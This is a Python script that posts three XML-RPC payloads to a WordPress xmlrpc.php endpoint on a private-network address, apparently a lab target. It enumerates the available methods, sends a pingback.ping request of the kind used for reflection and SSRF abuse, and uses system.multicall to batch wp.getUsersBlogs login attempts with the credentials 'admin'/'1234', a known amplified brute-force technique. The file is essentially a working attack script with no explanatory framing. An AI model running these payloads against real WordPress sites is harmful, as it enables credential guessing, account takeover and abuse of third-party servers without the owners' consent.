import requests

def send_request(url, data):
    try:
        headers = {
            'Content-Type': 'text/xml',
        }
        response = requests.post(url, data=data, headers=headers)
        if response.status_code == 200:
            print(f"Success: {response.status_code}")
        else:
            print(f"Failed: {response.status_code}")
        print("Response:")
        print(response.text)
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

#Define the target URL
url = "http://192.168.7.10:8000/xmlrpc.php"

#Payload 1: system.listMethods
data1 = """<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""

#Payload 2: pingback.ping
data2 = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://example.com</string></value>
</param>
<param>
<value><string>http://192.168.7.10:8000/2025/01/28/hello-world/</string></value>
</param>
</params>
</methodCall>"""

#Payload 3: system.multicall
data3 = """<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>1234</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>1234</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>"""


#Send the requests
print("Sending Payload 1...")
send_request(url, data1)

print("Sending Payload 2...")
send_request(url, data2)

print("Sending Payload 3...")
send_request(url, data3)
